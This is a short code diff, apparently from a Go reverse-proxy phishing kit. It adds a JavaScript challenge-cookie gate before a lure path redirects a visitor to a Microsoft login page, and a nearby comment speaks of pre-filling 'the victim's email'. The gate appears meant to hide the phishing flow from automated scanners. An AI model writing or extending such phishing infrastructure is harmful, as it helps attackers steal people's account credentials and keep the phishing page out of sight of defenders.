@@ -673,6 +673,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
+						// JS challenge gate — must pass before any redirect
+						if !ValidChallengeCookie(req, req_path, p.challengeSecret) {
+							return ChallengeResponse(req, req_path, p.challengeSecret)
+						}
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
 						// Forward login_hint so Microsoft pre-fills the victim's email.
